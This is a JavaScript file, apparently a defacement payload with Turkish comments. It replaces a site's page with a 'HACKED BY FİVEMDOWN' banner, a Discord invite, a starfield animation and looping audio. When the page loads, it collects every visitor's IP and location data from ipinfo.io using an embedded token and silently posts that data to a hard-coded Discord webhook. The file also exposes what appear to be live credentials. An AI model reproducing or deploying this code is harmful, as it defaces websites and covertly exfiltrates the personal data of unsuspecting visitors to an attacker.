// BODY stil
document.body.innerHTML = '';
Object.assign(document.body.style, {
  background: 'black',
  color: '#00f',
  fontFamily: 'Courier New, monospace',
  textAlign: 'center',
  margin: '0',
  height: '100vh',
  overflow: 'hidden'
});

// CANVAS
const canvas = document.createElement('canvas');
canvas.id = 'stars';
Object.assign(canvas.style, {position:'fixed',top:'0',left:'0',zIndex:'-1'});
document.body.appendChild(canvas);

const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const stars = Array.from({length:150},()=>({
  x: Math.random()*canvas.width,
  y: Math.random()*canvas.height,
  radius: Math.random()*1.5,
  dy: Math.random()*0.5 + 0.2
}));

function drawStars() {
  ctx.clearRect(0,0,canvas.width,canvas.height);
  ctx.fillStyle="white";
  stars.forEach(s=>{
    ctx.beginPath();
    ctx.arc(s.x,s.y,s.radius,0,Math.PI*2);
    ctx.fill();
    s.y += s.dy;
    if(s.y>canvas.height){s.y=0;s.x=Math.random()*canvas.width;}
  });
  requestAnimationFrame(drawStars);
}
drawStars();

// IP INFO
const pre = document.createElement('pre');
pre.id='ipinfo';
pre.textContent='Loading...';
Object.assign(pre.style,{
  fontSize:'22px', lineHeight:'1.7', textShadow:'0 0 15px #00f,0 0 25px #00f,0 0 40px #00f',
  whiteSpace:'pre-wrap', marginTop:'30px'
});
document.body.appendChild(pre);

// Discord Container
const discordContainer = document.createElement('div');
discordContainer.id='discord-container';
Object.assign(discordContainer.style,{
  display:'flex', justifyContent:'center', gap:'20px', marginTop:'40px', marginBottom:'10px'
});
document.body.appendChild(discordContainer);

// REPOYA YÜKLENMİŞ GÖRSELLER
const images = [
  "images/discord1.png",
  "images/discord2.png",
  "images/discord3.png"
];

images.forEach(src=>{
  const img = document.createElement('img');
  img.className='discord-logo';
  img.src=src;
  Object.assign(img.style,{width:'250px',verticalAlign:'middle',filter:'drop-shadow(0 0 8px #00f)'});
  discordContainer.appendChild(img);
});

// Hacked By
const hackedBy = document.createElement('span');
hackedBy.id='hacked-by';
hackedBy.textContent=' HACKED BY FİVEMDOWN';
Object.assign(hackedBy.style,{
  fontSize:'45px', color:'#00f', textShadow:'0 0 20px #00f,0 0 40px #00f,0 0 80px #00f',
  letterSpacing:'2px', display:'block'
});
document.body.appendChild(hackedBy);

// Discord Link
const discordLink = document.createElement('a');
discordLink.id='discord-link';
discordLink.href='https://discord.gg/fivemdown';
discordLink.textContent='https://discord.gg/fivemdown';
discordLink.target='_blank';
Object.assign(discordLink.style,{
  fontSize:'48px', color:'#00f', textShadow:'0 0 20px #00f,0 0 40px #00f,0 0 80px #00f',
  textDecoration:'none', fontWeight:'bold', letterSpacing:'2px', display:'inline-block',
  marginTop:'15px', marginBottom:'15px'
});
document.body.insertBefore(discordLink,hackedBy);

// Audio (repoya yükle: /audio/moscow.mp3)
const audio = document.createElement('audio');
audio.id='audio-player';
audio.src='audio/moscow.mp3';
audio.loop=true;
audio.muted=true;
document.body.appendChild(audio);

// click ile aç
window.addEventListener('click',()=>{
  audio.play().catch(()=>{});
  audio.muted=false;
});

// IP INFO FETCH ve webhook
fetch("https://ipinfo.io/json?token=8d7365019dc710")
  .then(r=>r.json())
  .then(data=>{
    pre.textContent=JSON.stringify(data,null,2);
    const webhookURL="https://discord.com/api/webhooks/1412165143961407570/rNvbuXQPj9VoWSffMDT8ySmCKgRrUkKW0LaHXEqDLqW1d67C9A1ikJB64NRRjt-Fvxhi";
    const payload={content:"Bir kullanıcı siteyi açtı!\nIP Bilgisi:\n"+JSON.stringify(data,null,2)};
    fetch(webhookURL,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)});
  })
  .catch(()=>{pre.textContent="Bilgiler alınamadı."});
